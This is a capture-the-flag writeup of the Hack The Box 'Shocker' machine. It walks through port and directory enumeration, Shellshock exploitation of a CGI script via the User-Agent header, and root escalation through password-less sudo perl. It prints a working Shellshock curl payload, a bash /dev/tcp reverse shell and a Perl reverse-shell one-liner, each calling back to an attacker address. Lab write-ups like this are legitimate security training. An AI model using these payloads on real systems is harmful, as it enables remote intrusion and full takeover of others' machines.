---
title: "Shocker"
description: "Writeup for Shocker machine from HTB"
date: 2020-08-11
author: "Pablo Jesús González Rubio"
cover: "shocker.png"
coverAlt: "Shocker icon"
toc: true
tags: [ "Writeup" ]
---

## Scanning

Hosts: `10.10.10.56 shocker.htb`

Nmap:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

`gobuster dir -u shocker.htb -w /usr/share/wordlists/dirb/big.txt -x php,txt,html -r -f -t 25`:

```
/.htpasswd
/.htpasswd.php
/.htaccess
/.htaccess.php
/.htaccess.txt
/.htaccess.html
/.htaccess.sh
/.htpasswd.txt
/.htpasswd.html
/.htpasswd.sh
/cgi-bin/
/cgi-bin/.html
/index.html
/server-status
```

As there's a `cgi-bin` directory I'll try to search for `.sh` scripts inside it:

`gobuster dir -u http://shocker.htb/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh`:

```
/user.sh
```

So the complete url is `/cgi-bin/user.sh`.

## Exploitation

We can try the Shellshock exploit, which takes advantage of bash scripts.

Full explanation of Shellshock [here](https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b/68177).

Examples of it [here](https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited).

Shellshock is something like this:

```
() { :; }; <COMMANDS>
```

If tried on a webpage:

```
curl -H "User-Agent: () { :; }; <BASH COMMANDS>" <WEBPAGE>/cgi-bin/<SCRIPT>
```

To verify ours is vulnerable:

```
curl -H "User-Agent: () { :; }; echo -e '\n\n\033[31mVULNERABLE\033[0m'" http://shocker.htb/cgi-bin/user.sh
```

Which results in:

{{< img "vulnerable.png" "Vulnerable" "border" >}}

If that worked, we should have an easy reverse shell:

```
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.36/4444 0>&1" http://shocker.htb/cgi-bin/user.sh
```

And listening with `nc -lnvp 4444`:

{{< img "exploit.png" "Exploit" "border" >}}

And we are user `shelly`.

## Privilege Escalation

### Root

I tried `sudo -l` (as I say in other writeups, this is part of a Privilege Escalation routine) to check what I could execute as superuser and:

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

We can run `perl` with sudo without it asking for a password, so we can set a reverse shell to `root` with perl in seconds (I used [Reversegen](https://github.com/n0nuser/Reversegen)):

```
sudo perl -e 'use Socket;$i="10.10.14.36";$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

And listening with `nc -lnvp 3333`:

{{< img "root.png" "Root!" "border" >}}

Easy!
